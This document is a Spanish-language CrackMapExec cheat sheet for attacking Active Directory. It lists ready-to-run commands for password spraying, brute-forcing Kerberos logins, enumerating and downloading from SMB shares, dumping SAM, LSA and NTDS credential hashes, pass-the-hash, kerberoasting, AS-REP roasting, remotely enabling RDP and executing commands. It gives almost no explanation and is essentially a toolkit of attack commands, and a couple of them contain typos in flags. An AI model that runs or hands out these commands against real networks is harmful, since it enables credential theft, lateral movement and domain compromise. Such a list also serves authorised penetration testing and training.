### Listar equipos dentro de la red de un AD:
$ crackmapexec smb 192.168.1.0/24
### SMB con credenciales a dominio WORKGROUP:
$ crackmapexec smb {IP-address} -u '{USERNAME}' -p '{PASSWORD}' -d WORKGROUP
### Password Spraying:
$ crackmapexec smb 192.168.1.0/24 -u '{USERNAME}' -p listpassword.txt
### Spraying Attack con usuario y contraseña lineal:
$ crackmapexec smb {IP-ADDRESS} -u users.txt -p passwd.txt --no-bruteforce --continue-on-success
### Spraying Attack:
$ crackmapexec smb {IP} -u users.txt -p '{PASSWORD}' --continue-on-sucess
### Conocer en que equipos se puede autenticar especificando un usuario y password:
$ crackmapexec smb {IP/CIDR} -u '{USERNAME}' -p '{PASSWORD}'
### Enumeración de directorios compartidos SMB con NULL session:
$ crackmapexec smb {IP} -u 'null' -p ' '--shares
### Mostrar el contenido de un directorio compartido en SMB con credenciales:
$ crackmapexec smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --spider {DIRECTORY-NAME} --regex .
### Descargar un archivo de un directorio compartido:
$ crackmapexec smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --share {DIRECTORY-NAME} --get-file {FILE-NAME} {OUTPUT-NAME}
### Enumerar usuarios por Brute Force por RID:
$ crackmapexec smb {IP} -u 'guest' -p '' --rid-brute
### Dumping Hashes SAM:
$ crackmapexec smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --sam
### Dumping Hashes NTLM:
$ crackmapexec smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --ntds
### Dumping Hashes LSA:
$ crackmapexec smb {IP} -u 'Administrator' -p '{PASSWORD}' --lsa
### Dumping Hashes NTD:
$ crackmapexec smb {IP} -u 'Administrator' -H '{HASH-NT}' --ntds vss
### PassTheHash:
$ crackmapexec smb {IP} -u '{USERNAME}' -H '{HASH}' --local-auth
### LAPS:
$ crackmapexec smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --laps
### Fuerza bruta para Autenticación a Kerberos:
$ crackmapexec smb {IP} -u users.txt -p '' --kerberos
### Ataque de kerberoasting:
$ crackmapexec ldap {IP} -u '{USERNAME}' -p '{PASSWORD}' --kerberoasting {OUTPUT-FILE}
### Ataque de Asreproast:
$ crackmapexec ldap {IP} -u '{USERNAME}' -p '{PASSWORD}' --asreproast {OUTPUT-FILE}
### Habilitar RDP con usuario y password de Administrador:
$ crackmapexec smb {IP} -u '{USERNAME}' -p '{PASSWORD}' -M rdp -o action=enable
### Ejecutar comandos usando el Hash:
$ crackmapexec smb {IP} -u '{USERNAME}' -H '{HASH}' -d {GROUP} -x 'COMMAND'